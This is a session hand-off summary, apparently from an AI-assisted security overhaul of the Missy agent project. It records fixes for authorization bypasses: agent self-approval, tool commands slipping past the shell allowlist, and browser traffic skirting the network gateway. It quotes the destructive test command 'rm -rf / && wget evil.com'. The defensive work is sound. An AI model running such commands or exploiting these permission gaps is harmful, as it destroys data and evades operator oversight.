# LAST_SESSION_SUMMARY

Date: 2026-07-10

Branch: `overhaul/missy-validation-20260710-031406`
Draft PR: https://github.com/MissyLabs/missy/pull/31

## Changed (12 checkpoints this session, full suite green after every one)

1. Preserved/hardened the existing `voice_commands.py` fix; fixed a real
   trailing-comma leak bug the new regression tests caught.
2. **FX-A**: forced the acpx delegate provider through Missy's
   structured tool protocol (zero native tools, fail-closed permissions,
   isolated cwd, config-can't-override sanitization, delegation
   envelope, leaked-marker defense). Dominant root cause behind ~30 of
   43 failing validation cases.
3. **FX-B**: fixed the production memory backend mismatch — Discord
   conversation turns were being written to the wrong file. Found the
   identical bug independently in `VisionMemoryBridge`.
4. **FX-E + SR-1.2/1.3 (critical)**: closed a live, unauthenticated
   code-self-approval vulnerability (default system prompt taught
   self-approval; a second instance let any Discord user approve via
   emoji reaction).
5. **SR-1.12 (critical)**: closed an unauthenticated Discord DM-pairing
   self-approval bypass (any unpaired stranger, two messages, zero auth).
6. **FX-D**: explicit structural current-turn boundary in the acpx
   prompt + fail-closed on totally fabricated delegate responses.
7. **SR-1.13 (critical, two findings)**: Discord message-command and
   slash-command ingress both lacked proper authorization; the latter
   also had a cross-user session-bleeding bug (`session_id="discord"`
   hardcoded for every user).
8. **FX-C**: grounded memory-ID lookups (exception vs. genuinely
   missing); confirmed and locked in with tests that Incus tools are
   fabrication-proof at the tool layer; added an explicit envelope rule
   against padding/altering structured tool results.
9. **FX-F bullet 1**: browser error classification (tool absence vs.
   installation vs. sandbox/kernel failure vs. real interaction error),
   live-verified against this dev sandbox's actual missing-playwright
   state.
10. **FX-G**: safe upper bound on acpx timeout config + explicit
    "outcome is UNKNOWN, verify before retry, make retries idempotent"
    timeout messaging. Attempted process-group cleanup on timeout too,
    but reverted after it broke ~136 existing tests (mocks target
    `subprocess.run`, the fix needed `subprocess.Popen`) — tracked as
    task #17 for a dedicated session.
11. **SR-1.8**: found and fixed a fifth critical finding —
    `ShellPolicyEngine.check_command()` treated an empty
    `allowed_commands` list as allow-all whenever `shell.enabled: true`,
    directly contradicting `ShellPolicy`'s own docstring and every piece
    of operator-facing documentation, all of which already correctly
    promised deny-all. A pre-existing test literally asserted
    `rm -rf / && wget evil.com` passed policy under that exact default
    config. Fixed the implementation to match its own documented
    contract; no doc changes needed.
12. **SR-1.6 groundwork / SR-1.5 (sixth critical finding)**: fixed the
    review's "architectural finding" pattern for Incus tools —
    `ToolRegistry._check_permissions()` derived the checked shell
    command from a generic `command` kwarg that 14 of 15 Incus tools
    don't have (checking the meaningless literal `"shell"` instead of
    the real `incus` binary), and `incus_exec`'s `command` kwarg names
    the *guest* command, not the host binary. Live-reproduced
    end-to-end: with `allowed_commands=["bash"]`,
    `incus_exec(command="bash")` passed policy and executed the real
    host `incus exec ... -- bash -c bash`, despite `incus` never being
    allowlisted. Also fixed: `incus_file`'s `host_path` was never
    checked against the filesystem policy at all (declared `shell=True`
    only). Fixed generally via two new optional `BaseTool` hooks
    (`resolve_shell_command`, `resolve_filesystem_targets`) rather than
    special-casing Incus — any first-party tool can now declare its real
    operation instead of relying on a kwarg-name heuristic that several
    tools' actual kwargs don't match. Verified zero behavior change for
    tools that don't opt into the new hooks.

**Six independent, confirmed critical authorization-bypass
vulnerabilities** found and fixed this session (SR-1.2/1.3, SR-1.12,
SR-1.13 ×2, SR-1.8, SR-1.5), all variations on the same underlying
pattern: an unauthenticated or unrestricted action reachable due to a
fail-open default, a missing gate, or (SR-1.5's variant) declared tool
metadata that doesn't match the operation actually performed. Plus the
FX-A/B/C/D/F/G validation-harness root causes.

**All of FX-A through FX-G are now done** per the prompt's stated
dependency order (some with residual/deferred sub-items tracked as
separate tasks — see below).

## Verification

```text
python3 -m pytest tests/ -q -o faulthandler_timeout=120 \
  --deselect tests/vision/test_discovery_capture_sysfs.py::TestCacheTTL::test_cache_valid_within_ttl \
  --deselect tests/vision/test_discovery_edge_cases.py::TestPermissionDeniedOnDevice::test_device_that_does_not_exist_is_skipped \
  --deselect tests/vision/test_discovery_edge_cases.py::TestRapidAddRemove::test_cached_results_returned_within_ttl
20770 passed, 13 skipped, 3 deselected in 448.20s (0:07:28)
```

Full detail in `BUILD_STATUS.md`, `AUDIT_SECURITY.md`, and
`TEST_RESULTS.md` — each has one dated entry per checkpoint this
session, oldest at the bottom, nothing overwritten.

## Open tasks (session-tracked, carry into next session)

- **#9** SR-1.x through SR-4.x security review remediation — most of
  it. This session covered SR-1.2/1.3, SR-1.5, SR-1.8, SR-1.12, SR-1.13
  (plus SR-3.1 substantially via FX-B). SR-1.1, SR-1.4, SR-1.6 through
  SR-1.11, SR-2.x, SR-3.2 through SR-3.5, SR-4.x remain. Note: SR-1.5's
  fix added a general per-tool permission-resolution mechanism
  (`BaseTool.resolve_shell_command`/`resolve_filesystem_targets`) that
  SR-1.4 (the same heuristic gap in other tools, e.g. `vision_capture`)
  can reuse directly rather than needing its own design.
- **#10** Full 89-case tool-specific validation backlog — not yet
  re-run against current code.
- **#11** Pre-existing vision `CameraDiscovery` cache-TTL flake (3
  tests) — confirmed present before this session's changes, unrelated,
  small isolated fix needed in `missy/vision/discovery.py`.
- **#12** Wire an authenticated Discord pairing approval endpoint —
  the SR-1.12 fix removed the vulnerable path but pairing currently has
  *no* working approval surface at all.
- **#15** `allowed_roles` Discord config field documented but never
  enforced.
- **#16** FX-F bullets 2/4: build an actual disposable, threat-modeled
  browser-test environment and rerun WB-002 through WB-007 + XT-001
  against it. This dev sandbox cannot launch a browser at all (no
  playwright installed) — confirmed live, matching the harness's own
  observation.
- **#17** FX-G process-group cleanup on acpx timeout — implementation
  works but needs the test-suite migration from mocking
  `subprocess.run` to `subprocess.Popen` done carefully in its own
  session.
- **New this checkpoint:** SR-1.4 (same declaration/dispatch mismatch
  pattern in `vision_capture`'s `source`/`save_path` kwargs and any
  other first-party tool using nonstandard kwarg names) and SR-1.6
  (Playwright browser navigation bypasses `PolicyHTTPClient`/the
  network gateway entirely — a different, non-shell mechanism) remain
  open and are the natural next candidates given the pattern established
  by SR-1.5.

## The single biggest remaining gap

**None of this session's fixes have been validated against a real or
scripted acpx delegate invocation.** All verification so far is
unit/integration-level with mocks, or against the real (but
non-LLM-calling) acpx binary for `--version`/`--help`. FX-A bullet 6
("prove end to end that representative filesystem, shell, browser,
X11, AT-SPI, vision, audio, Discord upload, memory, self_create_tool,
and code_evolve requests produce the expected registry, policy, and
audit events") is still fully open, and it's the prerequisite for
re-running most of the 89-case validation backlog with real evidence
rather than code-level reasoning about what *should* happen.

## First Next Step

If a way to safely exercise a real or scripted acpx delegate call
becomes available, prioritize FX-A bullet 6 — it unblocks re-validating
everything else. Otherwise, continue the SR-1.x security sweep — SR-1.6
(Playwright bypassing the network gateway) is the strongest remaining
candidate: it's a crown-jewel bypass ("no outbound unless whitelisted"
being the product's core claim) and, unlike SR-1.5, requires a genuinely
different mechanism (the tool calls Playwright directly instead of
`PolicyHTTPClient`), so it can't reuse the resolve_* hooks alone — or
pick up one of the concrete scoped tasks above (#11, #12, #15, #16,
#17) — all are self-contained and don't require a live delegate.
